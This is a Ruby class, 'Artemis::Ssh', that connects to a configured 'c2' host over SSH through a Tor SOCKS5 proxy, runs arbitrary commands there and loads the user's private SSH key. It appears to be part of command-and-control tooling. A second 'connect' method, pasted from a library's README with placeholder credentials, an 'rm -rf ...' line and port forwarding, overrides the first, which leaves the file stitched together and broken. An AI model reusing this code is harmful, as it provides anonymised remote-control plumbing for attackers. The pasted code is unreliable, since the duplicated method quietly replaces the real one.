require 'net/ssh'
require 'logger'
require 'net/ssh/proxy/socks5'


module Artemis
  class Ssh
    attr_accessor :logger, :config, :user, :host, :proxy

    def initialize
      @logger = Logger.new(STDOUT)
      @config = Configuration.new
      @user = @config.c2.user
      @host = @config.c2.ip
      @proxy = Net::SSH::Proxy::SOCKS5.new('localhost', 9050)
    end

    def connect
      yield(Net::SSH.start(@host, @user, :proxy => @proxy))
    end

    def execute(command)
      Net::SSH.start(@host, @user, :proxy => @proxy) do |ssh|
        ssh.exec! command
      end
    end

    def setup
      key_manager.add(private_key)

    end

    def pub_key
      File.join(Dir.home, '.ssh', 'id_rsa.pub')
    end

    def private_key
      File.join(Dir.home, '.ssh', 'id_rsa')
    end

    def key_manager
      @key_manager ||= Net::SSH::Authentication::KeyManager.new @logger
    end

    def connect

      Net::SSH.start('host', 'user', password: "password") do |ssh|
        # capture all stderr and stdout output from a remote process
        output = ssh.exec!("hostname")
        puts output

        # capture only stdout matching a particular pattern
        stdout = ""
        ssh.exec!("ls -l /home/jamis") do |channel, stream, data|
          stdout << data if stream == :stdout
        end
        puts stdout

        # run multiple processes in parallel to completion
        ssh.exec "sed ..."
        ssh.exec "awk ..."
        ssh.exec "rm -rf ..."
        ssh.loop

        # open a new channel and configure a minimal set of callbacks, then run
        # the event loop until the channel finishes (closes)
        channel = ssh.open_channel do |ch|
          ch.exec "/usr/local/bin/ruby /path/to/file.rb" do |ch, success|
            raise "could not execute command" unless success

            # "on_data" is called when the process writes something to stdout
            ch.on_data do |c, data|
              $stdout.print data
            end

            # "on_extended_data" is called when the process writes something to stderr
            ch.on_extended_data do |c, type, data|
              $stderr.print data
            end

            ch.on_close {puts "done!"}
          end
        end

        channel.wait

        # forward connections on local port 1234 to port 80 of www.capify.org
        ssh.forward.local(1234, "www.capify.org", 80)
        ssh.loop {true}
      end
    end

  end
end